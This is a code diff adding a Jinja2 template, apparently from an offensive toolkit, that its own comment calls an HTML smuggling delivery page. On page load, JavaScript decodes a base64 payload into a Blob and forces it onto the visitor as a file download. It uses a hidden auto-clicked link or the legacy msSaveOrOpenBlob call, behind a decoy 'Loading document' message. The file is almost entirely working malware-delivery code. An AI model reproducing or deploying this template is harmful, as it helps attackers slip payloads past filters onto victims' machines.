@@ -1,0 +1,34 @@
+{# templates/shells/html_smuggle.j2
+   HTML smuggling delivery page.
+   Payload is embedded as a base64 data URI and forced as a browser download.
+   No external resources fetched. Compatible with IE/Edge legacy (msSaveOrOpenBlob)
+   and all modern browsers (anchor download attribute).
+   Variables: b64_payload (str), filename (str), title (str), mime_type (str)
+#}
+<!DOCTYPE html>
+<html>
+<head><title>{{ title }}</title></head>
+<body>
+<p>Loading document, please wait&hellip;</p>
+<script>
+(function(){
+  var b64 = "{{ b64_payload }}";
+  var bin = atob(b64);
+  var ab  = new ArrayBuffer(bin.length);
+  var ua  = new Uint8Array(ab);
+  for (var i = 0; i < bin.length; i++){ ua[i] = bin.charCodeAt(i); }
+  var blob = new Blob([ab], {type: "{{ mime_type }}"});
+  if (window.navigator && window.navigator.msSaveOrOpenBlob){
+    window.navigator.msSaveOrOpenBlob(blob, "{{ filename }}");
+  } else {
+    var a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "{{ filename }}";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+})();
+</script>
+</body>
+</html>
